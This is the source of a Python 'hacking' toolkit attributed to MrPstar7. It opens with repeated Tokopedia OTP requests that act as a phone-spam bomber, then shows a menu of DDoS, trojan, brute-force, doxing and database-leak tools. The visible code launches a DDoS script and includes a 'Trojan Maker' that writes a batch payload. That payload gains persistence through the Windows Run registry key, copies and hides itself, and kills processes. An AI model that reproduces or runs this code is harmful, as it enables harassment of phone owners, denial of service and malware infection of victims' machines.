            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 4.4.2; iris353 Build/iris353) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie9; rv:11.0) like Gecko",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060905 Fedora/1.5.0.6-10 Firefox/1.5.0.6 pango-text",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20060323 Firefox/1.6a1",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4','Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            
def tool():
    print(f"{M} Information Recovery..")
    time.sleep(2)
    print(f"""{M}
    {M}Name Tool    :  {P}{name_tool}
    {M}Version      :  {P}{version_tool}
    {M}Coding       :  {P}{coding_tool}
    {M}Creator      :  {P}{creator}
    {M}Platform     :  {P}{platform}
    {M}Github Tools :  {P}{github_tool}
    {M}Phone Number :  {P}{phonenumbers}
    {M}Telegram     :  {P}{telegram}
    {M}Instagram    :  {P}{instagram}
    {M}GitHub       :  {P}{github}
    {M}YouTube      :  {P}{Y}
    """)
    
clear()
os.system("neofetch --ascii_distro kali linux")
print(
f"""{M}
    
██████╗  █████╗ ██████╗ ██╗  ██╗███████╗████████╗ █████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ ███████╗   ██║   ███████║██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║   ██║   ██╔══██║██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗███████║   ██║   ██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
    """)
print(
f"""
{O}╔═════════════════════════════════════════════════════════════════════════════╗
{O}║{M} [+{M}] {P}Author  {M} : {P}MrPstar7             {O} ║ {M} [+{M}]{P} WhatsApp {M} : {P}+6285728337030   {O}   ║
{O}║{M} [+{M}] {P}Telegram{M} : {P}t.me/MrPstar7         {O}║{M}  [+{M}] {P}Instagram {M}: {P}pstar7.dev        {O}  ║
{O}║ {M}[+{M}] {P}Github   {M}: {P}github.com/Mr-Pstar7{O}  ║{M}  [+{M}] {P}YouTube   {M}:{P} @Mr-Pstar7      {O}    ║
{O}╚═════════════════════════════════════════════════════════════════════════════╝
{O}║                                    {M}Menu{O}                                     ║
{O}╔═════════════════════════════════════════════════════════════════════════════╗
{O}║{P}  [Page n°1                          {O} ║ {P} [Page n°1                          {O} ║
{O}║ {M} [{P}01{M}] -> {P}Tool Info                   {O}║{M}  [{P}21{M}] -> {P}Database Finder             {O}║
{O}║{M}  [{P}02{M}] -> {P}Layer7 DDOS              {O}   ║ {M} [{P}22{M}] -> {P}Database Leaker          {O}   ║
{O}║ {M} [{P}03{M}] ->{P} Trojan Maker                {O}║{M}  [{P}23{M}] ->{P} CCTV Finder              {O}   ║
{O}║{M}  [{P}04{M}] ->{P} SQL Vulnerability Scanner {O}  ║{M}  [{P}24{M}] ->{P} Dir Buster                 {O} ║
{O}║ {M} [{P}05{M}] ->{P} Bruteforce Instagram       {O} ║ {M} [{P}25{M}] -> {P}Script Deface Generator {O}    ║
{O}║  {M}[{P}06{M}] -> {P}Spam WhatsApp               {O}║ {M} [{P}26{M}] ->{P} YouTube Downloader          {O}║
{O}║ {M} [{P}07{M}] ->{P} Report Instagram          {O}  ║ {M} [{P}27{M}] -> {P}Hash Cracker               {O} ║
{O}║  {M}[{P}08{M}] ->{P} Dox Tracker (OSINT)         {O}║  {M}[{P}28{M}] ->{P} Email Search              {O}  ║
{O}║{M}  [{P}09{M}] ->{P} Dox Create                  {O}║ {M} [{P}29{M}] -> {P}Spam Bot Telegram           {O}║
{O}║{M}  [{P}10{M}] -> {P}Subdomain Finder            {O}║  {M}[{P}30{M}] -> {P}Get Source Code Website  {O}   ║
{O}║{M}  [{P}11{M}] -> {P}Auto Share Fb              {O} ║ {M} [{P}31{M}] -> {P}Cpanel Bruteforce        {O}   ║
{O}║{M}  [{P}12{M}] ->{P} Phone Number Info           {O}║  {M}[{P}32{M}] -> {P}Nik Checker                {O} ║
{O}║ {M} [{P}13{M}] -> {P}Layer4 DDOS                 {O}║ {M} [{P}33{M}] -> {P}Report Facebook         {O}    ║
{O}║ {M} [{P}14{M}] -> {P}Track IP                    {O}║  {M}[{P}34{M}] -> {P}Admin Login Page Finder{O}     ║
{O}║ {M} [{P}15{M}] ->{P} Get Ip Website              {O}║ {M} [{P}35{M}] -> {P}Crack Wifi All Password    {O} ║
{O}║ {M} [{P}16{M}] ->{P} Ip & Domain Port Scanner    {O}║  {M}[{P}36{M}] -> {P}Bruteforce Facebook Premium{O} ║
{O}║ {M} [{P}17{M}] ->{P} Domain Grabber              {O}║  {M}[{P}37{M}] -> {P}Email Scraper               {O}║
{O}║  {M}[{P}18{M}] -> {P}WordPress Bruteforce     {O}   ║{M}  [{P}38{M}] ->{P} Database Leaker V2          {O}║
{O}║  {M}[{P}19{M}] -> {P}Python Obfuscation          {O}║  {M}[{P}39{M}] -> {P}Webshell Finder          {O}   ║
{O}║ {M} [{P}20{M}] -> {P}Search In DataBase          {O}║ {M} [{P}40{M}] -> {P}Malware Generator          {O} ║
{O}╚═════════════════════════════════════════════════════════════════════════════╝
    """)
while True:
    choice = input(f"""{M}┌───({P}{username_pc}@darkstar{M})─[{P}~{M}] 
└──{P}$ {reset}""")
    if choice in["1","01"]:
        Title("Tool Info")
        tool()
        Continue()
        a()
    elif choice in["2","02"]:
        os.system("python3 ./DDOS/Layer7/main.py")
        Title("Layer7 DDOS")
        Continue()
        a()
    elif choice in["3","03"]:
        clear()
        Title("Trojan Maker")
        print(
        f"""{M}
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                                Trojan Maker
                            Powered By : MrPstar7
        """)
        
        menu = Write.Print(f"[01] Trojan Maker V1\n[02] Trojan Maker V2\n", Colors.blue_to_green, interval=0.05)
        
        name = Write.Input("\nSelect Menu -> ", Colors.red_to_purple, interval=0.0025)
         
        if name in["1","01"]:
            file_name1 = input(f"Input File Name : ")

            old_name = "./Trojan/Trojan.exe"
            new_name = f"./Trojan/{file_name1}.exe"
            
            if os.path.isfile(new_name):
                print(f"{M}File name already exists. Cannot rename")
            else:
                # Rename the file
                os.rename(old_name, new_name)
            print(f"{M}Creating...")
            time.sleep(10)
            print(Colorate.Horizontal(Colors.yellow_to_red, f"File Trojan {file_name1} Has Been Created. Saved In Trojan/{file_name1}.exe!", 1))
            print(Colorate.Horizontal(Colors.yellow_to_red, "Warning!, Dont you dare to click / open the file !", 1))
                
        elif name in["2","02"]:
            file_name = input(f"Input File Name : ")
            extension = input(f"Save AS [Example : bat, exe, vbs]: ")
            trojan = "@Echo offcolor 4title 4title R.I.Pstartstartstartstart calccopy %0 %Systemroot%\Greatgame > nulreg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ/d %systemroot%\Greatgame.bat /f > nulcopy %0 *.bat > nulAttrib +r +h Greatgame.batAttrib +r +hRUNDLL32 USER32.DLL.SwapMouseButtonstart calcclstskill msnmsgrtskill LimeWiretskill iexploretskill NMainstartclscd %userprofile%\desktopcopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.exe"
            def log(file_name):
                file = open((file_name) + f".{extension}", "a")
                file.write(str(trojan))
                file.close
                file_name = file_name
                print(f"{M}Creating...")
                time.sleep(6)
                print(Colorate.Horizontal(Colors.blue_to_purple, f"File Trojan {file_name} Has Been Created !", 1))
                print(Colorate.Horizontal(Colors.blue_to_purple, "Warning!, Dont you dare to click / open the file !", 1))
            log(file_name)
        Continue()
        a()
    elif choice in["4","04"]:
